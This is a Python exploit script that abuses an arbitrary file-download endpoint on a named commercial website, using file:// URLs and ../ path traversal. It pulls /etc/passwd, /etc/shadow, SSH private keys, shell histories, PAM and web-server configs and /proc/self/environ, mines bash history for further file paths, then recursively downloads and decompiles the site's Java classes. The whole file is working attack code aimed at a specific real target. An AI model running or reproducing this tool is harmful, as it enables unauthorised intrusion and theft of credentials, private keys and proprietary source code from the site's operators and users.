import argparse
import requests
import os
import re
import time
import subprocess
from pathlib import Path

home_directory_files = [
    ".bashrc",
    ".bash_profile",
    ".bash_logout",
    ".profile",
    ".bash_history",
    ".zshrc",
    ".zsh_history",
    ".vimrc",
    ".viminfo",
    ".tmux.conf",
    ".gitconfig",
    ".gitignore_global",
    ".mysql_history",
    ".dist.history"
    
    ".ssh/",
    ".ssh/id_rsa",
    ".ssh/id_rsa.pub",
    ".ssh/id_ecdsa",
    ".ssh/id_ecdsa.pub",
    ".ssh/id_ed25519",
    ".ssh/id_ed25519.pub",
    ".ssh/authorized_keys",
    ".ssh/known_hosts",
    ".ssh/config",
    
    ".zhistory",
    ".history",
    ".sh_history",
    ".nano_history",
    ".sqlite_history",

    ".xsession",
    ".xinitrc",
    ".xprofile",
    ".Xresources",
]

system_file = [

    [
        "/etc/nginx/nginx.conf",
        "/etc/nginx/conf.d/default.conf",
        "/etc/nginx/mime.types",
        "/etc/nginx/fastcgi_params",
        "/etc/nginx/fastcgi_params.default",
        "/etc/nginx/fastcgi.conf",
        "/etc/nginx/fastcgi.conf.default",
        "/etc/nginx/forceRestart.sh",
        "/etc/nginx/win-utf",
        "/etc/nginx/scgi_params",
        "/etc/nginx/fastcgi_params",
        "/etc/nginx/nginx.host"
        "/etc/nginx/scgi_params.default",
        "/etc/nginx/uwsgi_params.default",
        "/etc/nginx/uwsgi_params",
        "/etc/nginx/mime.types.default",
        "/etc/nginx/html/index.html",
        "/etc/nginx/html/50x.html",
        "/usr/share/nginx/html/index.html",
        "/usr/share/nginx/html/50x.html",
        "/var/www/html/index.html",
        "/var/www/html/index.nginx-debian.html",
    ],

    [
        "/etc/hosts",
        "/etc/hostname",
        "/etc/crontab",
        "/etc/resolv.conf",
        "/etc/host.conf",
        "/etc/ssh/sshd_config",
        "/etc/ssh/ssh_config",
        "/etc/apache2/apache2.conf",
        "/etc/mysql/my.cnf",
        "/etc/passwd",
        "/etc/passwd-",
        "/etc/shadow-",
        "/etc/shadow",
        "/etc/sysctl.conf",
        "/etc/bash.bashrc",
        "/etc/fstab",
        "/etc/rsyslog.conf",
        "/etc/services",
        "/etc/modules",
        "/etc/environment",
        "/etc/protocols",
        "/etc/hosts.allow",
        "/etc/hosts.deny",
        "/etc/httpd/conf/httpd.conf",
        "/etc/httpd/conf/magic",
        "/etc/httpd/conf/conf.d",
        "/etc/httpd/conf/autoindex.conf",
        "/etc/httpd/conf/README",
        "/etc/httpd/conf/userdir.conf",
        "/etc/ntp.conf",
        "/etc/ntp/crypto",
        "/etc/ntp/keys",
        "/etc/ntp/step-tickers",
        "/etc/os-release",
        "/etc/centos-release",
        "/etc/redhat-release",
        "/etc/pam.d/other",
        "/etc/pam.d/system-auth",
        "/etc/pam.d/password-auth",
        "/etc/pam.d/common-auth",
        "/etc/pam.d/common-account",
        "/etc/pam.d/common-password",
        "/etc/pam.d/common-session",
        "/etc/pam.d/chfn",
        "/etc/pam.d/chsh",
        "/etc/pam.d/config-util",
        "/etc/pam.d/crond",
        "/etc/pam.d/fingerprint-auth",
        "/etc/pam.d/fingerprint-auth-ac",
        "/etc/pam.d/login",
        "/etc/pam.d/passwd",
        "/etc/pam.d/password-auth-ac",
        "/etc/pam.d/postlogin",
        "/etc/pam.d/su",
        "/etc/pam.d/sudo",
        "/etc/pam.d/sudo-i",
        "/etc/pam.d/su-l",
        "/etc/pam.d/smtp",
        "/etc/pam.d/sshd",
        "/etc/pam.d/systemd-user",
        "/etc/pam.d/ppp",
        "/etc/pam.d/common-auth",
        "/etc/pam.d/common-password",


    ],

    [
        "/proc/self/maps",
        "/proc/self/cmdline",
        "/proc/self/exe",
        "/proc/self/cwd/maps",
        "/proc/self/environ",
        "/proc/self/net/tcp",
        "/proc/self/net/udp",
        "/proc/self/net/arp",
        "/proc/self/comm",
        "/proc/self/syscall",
        "/proc/self/loginuid",

    ],

    [
        "/var/log/nginx/error.log",
        "/var/log/nginx/access.log",
        "/var/log/cron",
        "/var/log/dmesg",
        "/var/log/secure",
        "/var/log/yum.log",
        "/var/log/lastlog",
        "/var/log/wtmp",
        "/var/log/utmp",
        "/var/log/btmp",
        "/var/log/tallylog",

    ],

    [
        "/usr/lib/x86_64-linux-gnu/libc.so.6",
        "/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2",
    ]
]

targets = ( "cat /", "vi /", "vim /", "nano /", "touch /", )

webTarget = ["WEB-INF", "web-inf", "webroot", "WebRoot", "webroots", "WebRoots", "WEB-INF/web.xml", "WEB-INF/classes", "application.properties", "application.yml", "application.yaml", "system.xml", "jdbc.xml", "web.xml", "Web.config", "Web.Config", "php.ini", "bootstrap.properties", "bootstrap.yml", "database.properties", "jdbc.properties", "config.properties", "configuration.properties", "root-context.xml", "server.xml", "context.xml", "tomcat-users.xml", "context-database.xml", "context-property.xml", "servlet-context.xml", "context-security.xml", "context-exception.xml", "JeusServer.log", "jeus8", "security.properties", "domain.xml", "bxm-application.xml", "com/"]

file_extensions = (
        'log', 'xml', 'class', 'properties', 'yml', 'yaml', 
        'conf', 'config', 'jsp', 'php', 'html', 'htm', 
        'js', 'css', 'txt', 'json', 'sql', 'db', 'bak', 
        'war', 'jar', 'sh', 'py', 'rb', 'java', 'cpp', 'c', 'h',
        'md', 'pdf', 'doc', 'docx', 'xls', 'xlsx'
    )

downloaded_file = []
attempt_file = []
homeDir = ""

# class_file extract
IMPORT_PATTERN = re.compile(r"^import com")
PACKAGE_PATTERN = re.compile(r"^package com")

downloaded_class_list = []

def extract_account(passwd: Path) -> None:
    global homeDir
    with open(passwd, "r") as f:
        for line in f:
            fields = line.rstrip("\n").split(":")
            if len(fields) >= 6:
                account = fields[0]
                home = fields[5]

                if home == "/":
                    bHistory = fields[5] + ".bash_history"
                else:
                    bHistory = fields[5] + "/.bash_history"

                bash_history = download_File(bHistory)
                if bash_history == b"":
                    continue
                elif bash_history != b"":
                    print("WAS was executed by " + account)
                    if fields[5] == "/":
                        homeDir = home
                    else:
                        homeDir = home + "/"
                    mkFile(bash_history, bHistory)


def mkFile(fileContent: bytes, filePath: str):
    base_dir = Path(__file__).parent / "extract"
    save_path = base_dir / filePath.lstrip("/")
    save_path.parent.mkdir(parents=True, exist_ok=True)
    save_path.write_bytes(fileContent)
    print("File Extract : " + str(save_path))


def download_HomeFile():
    for file in home_directory_files:
        if homeDir == "/":
            path = file
        else:
            path = homeDir + file
        result = download_File(path)
        if result == b"":
            continue
        elif result != b"":
            mkFile(result, path)

def download_SystemFile():
    for file_list in system_file:
        for file in file_list:
            path = file
            result = download_File(path)
            if result == b"":
                continue
            elif result != b"":
                mkFile(result, path)

def download_File(path: str) -> bytes:
    
    if path in downloaded_file:
        return b""
    else:
        downloaded_file.append(path)

    # print(path)
    # return b"success Download"

    targetUrl_GET = "https://www.officedepot.co.kr/common/file/download.do"
    targetUrl_POST = ""

    if targetUrl_GET:
        params = {

            "url": "file://" + path,
        }
        headers = {
            "Cookies": "JESSIONS"
        }
        response = requests.get(url=targetUrl_GET, params=params)
        time.sleep(0.2)
        if len(response.content) == 0:
            return b""
        else:
            return response.content
    
    elif targetUrl_POST:
        data = {

            "file": path,
            "path": "../../../"

        }
        headers = {
            "Cookies": "JESSION"
        }
        response.post(url=targetUrl_POST, data=data)
        time.sleep(0.2)
        if len(response.content) == 0:
            return b""
        else:
            return response.content
        

def solve_Bash_History():
    path = ""
    with open("." + homeDir + ".bash_history", "r") as f:
        for line in f:

            # if line.startswith("cd /"):
            #     path = line.strip().split(" ", 1)[1]

            if any(word in line for word in webTarget):
                print("Detect Line : " + line)
                matches = re.findall(r'(/[\w/.-]+)', line)
                for file_path in matches:
                    if file_path.endswith('/'):
                        continue
                    print("Download : " + file_path)
                    result = download_File(file_path)
                    if result and result != b"":
                        mkFile(result, file_path)
                    else:
                        print("Download failed or 0 byte: " + file_path)
            

            elif line.startswith("tail "):
                match = re.search(r'tail\s+.*?(/[\w/.-]+)', line)
                if match:
                    file_path = match.group(1)
                    result = download_File(file_path)
                    if result == b"":
                        continue
                    elif result != b"":
                        mkFile(result, file_path)

            elif line.startswith(targets):
                for target in targets:
                    if line.startswith(target):
                        file_path = line[len(target)-1:]
                        result = download_File(file_path)
                        if result == b"":
                            continue
                        elif result != b"":
                            mkFile(result, file_path)

            else:
                matches = re.findall(r'(\.?/[\w/.-]+(?:\.\w+)?)', line) 
                if matches: 
                    for file_path in matches:
                        filename = file_path.split('/')[-1]

                        if (file_path.endswith('/') or not filename or filename == '/' or '.' not in filename):        
                            continue
                        result = download_File(file_path)
                        if result and result != b"":
                            mkFile(result, file_path)



    
def cfr_decompile(cfr_path: Path, class_path: Path) -> list[str]:
    if not cfr_path.is_file():
        raise FileNotFoundError(f"CFR file not Found!!!")
    if not class_path.is_file():
        raise FileNotFoundError(f"class file not Found!!!")
    # print(cfr_path, class_path)

    result = subprocess.run(
        ["java", "-jar", str(cfr_path), str(class_path)],
        capture_output=True,
        text=True
    )
    # print(result.stdout)
    make_directory(result.stdout, class_path)
    return extract_class(result.stdout)

def make_directory(decompiled_result: str, fileName: Path) -> None:
    for line in decompiled_result.splitlines():
        if PACKAGE_PATTERN.search(line):
            # print(line)
            package_name = line.removeprefix("package ").rstrip(";").strip()
            # print(package_name)
            package_dir = Path(package_name.replace(".", "/"))
            package_dir.mkdir(parents=True, exist_ok=True)
            # print(package_dir)
            save_decompile_class_file(decompiled_result, Path(package_dir), Path(fileName).stem)

def save_decompile_class_file(decompile_result: str, save_path: Path, file_name: str):
    output_path = os.path.join(save_path, file_name)+".java"
    with open(output_path, "w", encoding="utf-8") as f:
        f.write(decompile_result)

def extract_class(decompile_class: str) -> list[str]:
    classPath_list = []
    for line in decompile_class.splitlines():
        if IMPORT_PATTERN.search(line):
            class_dir = line.removeprefix("import ").rstrip(";").strip()
            class_name = class_dir.replace(".", "/") + ".class"
            if re.search(r"service", class_name.split("/")[-1], re.IGNORECASE):
                classPath_list.append(class_name)
                classPath_list.append(class_name[:-6] + "Impl.class")
            elif re.search(r"dao", class_name.split("/")[-1], re.IGNORECASE):
                classPath_list.append(class_name)
                classPath_list.append(class_name[:-6] + ".xml")
            else:
                classPath_list.append(class_name)
    return classPath_list

# if you want POST method "targetUrl_GET = ''"
def download_classes(classPath_list: list[str]):
    targetUrl_GET = "https://www.officedepot.co.kr/common/file/download.do"
    targetUrl_POST = ""
    WEBROOT = "/storage/webroot/officedepot/htdocs/WEB-INF/classes/"
    if targetUrl_GET:
        for classPath in classPath_list:
            
            # print(WEBROOT+classPath)
            className = classPath.split("/")[-1]
            if className in downloaded_class_list:
                continue
            
            # Customize Data
            params = {
                "url": "file:///" + WEBROOT + classPath,
            }


            # params = {
            #     "fileNm": "file_name",
            #     # "filePath": file_name
            # }

            # Customize Header
            headers = {
                "User-Agent": "Mozilla/5.0",
                "Accept": "*/*",
                "Content-Type": "application/x-www-form-urlencoded",
                "Cookie": "JSESSIONID=<session_id>",
            }

            response = requests.get(targetUrl_GET, params=params)

            if len(response.content) == 0:
                continue

            with open(className, "wb") as f:
                downloaded_class_list.append(className)
                f.write(response.content)
                print("extract class : " + className)
            time.sleep(1)
            download_classes(cfr_decompile(Path("./cfr-0.152.jar"), Path(className)))

    elif targetUrl_POST:
        for file_name in classPath_list:
            
            # Customize Data
            data = {
                "file_Name": file_name,
                "file_Path": "../../../../",
            }
            # data = {
            #     "fileNm": file_name,
            #     "filePath": file_path,
            # }

            # Customize Header
            headers = {
                "User-Agent": "Mozilla/5.0",
                "Accept": "*/*",
                "Content-Type": "application/x-www-form-urlencoded",
                "Cookie": "JSESSIONID=<session_id>",
                "Referer": "https://example.com/",
                "Origin": "https://example.com",
            }

            response = requests.post(targetUrl_POST, data=data)
            if len(response.content) == 0:
                continue

            with open(file_name, "wb") as f:
                downloaded_class_list.append(className)
                f.write(response.content)
                print("extract class : " + className)
            time.sleep(1)
            download_classes(cfr_decompile(Path("./cfr-0.152.jar"), Path(className)))

def main():
    parser = argparse.ArgumentParser(
        description="Java Project Class or File extract via file download vulnerability"
    )
    parser.add_argument("--passwd", help="Leak passwd file")
    parser.add_argument("--class_file", help="Leak .class file path")
    args = parser.parse_args()

    if args.passwd:
        print("extract file via passwd ...")
        extract_account(Path(args.passwd))
        download_HomeFile()
        download_SystemFile()
        solve_Bash_History()
    else:
        print("[*] No passwd file provide...")
    
    if args.class_file:
        print("extract class file via seed .class ...")
        downloaded_class_list.append(args.class_file)
        classPath_list = cfr_decompile(Path("./cfr-0.152.jar"), Path(args.class_file))
        download_classes(classPath_list)
        print("Extract Class\n" + str(downloaded_class_list))
    
if __name__ == "__main__":
    main()
